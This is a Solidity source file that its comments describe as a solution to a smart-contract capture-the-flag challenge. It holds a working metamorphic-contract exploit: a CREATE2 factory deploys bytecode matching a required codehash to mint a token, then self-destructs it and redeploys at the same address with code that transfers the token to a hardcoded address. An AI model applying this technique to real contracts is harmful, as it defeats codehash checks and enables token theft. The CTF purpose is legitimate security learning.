// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./ERC20.sol";

contract Create2Factory {
    //This contract is the solution to a evmthroughctfs project where an ERC20 contract is able to mint tokens only if
    // the reciever contract's
    //bytecode/codehash is exactly the same as the one specified, which is a stale contract that can only
    // self-destruct(therefore it cannot transfer the ERC20 tokens
    //elswhere)
    //To win you will have to have one ERC20 token on your wallet, meaning you will have to somehow unlock the token
    // from the stale contract.

    //To do so I have implemented a contract that deploys a contract to a deterministic address with the CREATE2 opcode.
    //The CREATE2 requires the same deployer, the same salt, and the same creationcode, but this doesnt mean it needs
    // the same runtime bytecode.
    //At first it will be deployed with the required bytecode to mint a token.
    //It will then be selfdestructed and redeployed with a different bytecode, capable of transfering the ERC20

    //The names of the functions and inputs are not relevant to the functionality

    OnlyImAllowedToHaveTokensModified public _contract;

    bool public originalImplementation = true;

    //function that controls the bool that determines which implementation is deployed during creation of the CREATE2
    // deterministic address contract.
    function dontCopyMySolution() public {
        if (originalImplementation) {
            originalImplementation = false;
        } else {
            originalImplementation = true;
        }
    }
    //function called by the deployed contract with CREATE2, it returns one of two implementations depending on the bool
    // originalImplementation
    //if the originalImplementation is true, it returns the bytecode to be deployed of the original contract that will
    // have the codehash required by the mint function.
    //if its set to false, it will return the bytecode of a contract that has a function that transfers the minted token
    // to my address.

    function thisDoesntDoAnything() public view returns (bytes memory bytecode) {
        if (originalImplementation) {
            //
            bytecode =
                hex"6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b603233ff5b00fea26469706673582212204a564a5700b9e7efad230baa249ebfefeb664f5341ee855fbf69e63cbadef49b64736f6c63430008110033";
        } else {
            bytecode =
                hex"608060405234801561001057600080fd5b50600436106100365760003560e01c8063b05c05671461003b578063e71b8b9314610050575b600080fd5b61004e61004936600461017b565b610056565b005b61004e33ff5b6040517fa9059cbb000000000000000000000000000000000000000000000000000000008152731825d3eb7763e144172abeb92fdcfdd5d1bf6e4c60048201526001602482015273ffffffffffffffffffffffffffffffffffffffff82169063a9059cbb906044016020604051808303816000875af11580156100dd573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610101919061026b565b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b801515811461014457600080fd5b50565b803561015281610136565b919050565b803573ffffffffffffffffffffffffffffffffffffffff8116811461015257600080fd5b60008060006060848603121561019057600080fd5b833567ffffffffffffffff808211156101a857600080fd5b818601915086601f8301126101bc57600080fd5b8135818111156101ce576101ce610107565b604051601f82017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0908116603f0116810190838211818310171561021457610214610107565b8160405282815289602084870101111561022d57600080fd5b82602086016020830137600060208483010152809750505050505061025460208501610147565b915061026260408501610157565b90509250925092565b60006020828403121561027d57600080fd5b815161028881610136565b939250505056";
        }
    }

    //deploys contract with CREATE2, it calls with an arg for the constructor the this contracts address, so that the
    // deployed contract during construction
    //can query the desired bytecode to be deployed.

    function whatDoesThisDo(uint256 _sugar) public returns (address) {
        _contract = new OnlyImAllowedToHaveTokensModified{
            salt: bytes32(_sugar)    
        }(address(this));
        return (address(_contract));
    }
}

contract ModifiedContract {
    //transfers 1 ERC20 token to my address
    function YouMustBeWonderingWhatTheFuckDoesThisDo(string memory You, bool Cheeky, address Lad) public {
        ERC20(Lad).transfer(0x1825d3eB7763e144172abeb92fDcfdD5D1BF6e4C, 1);
    }

    function bye() external {
        selfdestruct(payable(msg.sender));
    }
}

contract OnlyImAllowedToHaveTokensModified {
    constructor(address whatAreYouLookingAt) {
        bytes memory bytecode;
        //Calls create2factory to query correct bytecode to deploy
        bytecode = Create2Factory(whatAreYouLookingAt).thisDoesntDoAnything();

        //assembly code to load to memory the runtime bytecode and return it, just as the initial part of the creation
        // code would do.
        assembly {
            return(add(bytecode, 0x20), mload(bytecode))
        }
    }
}
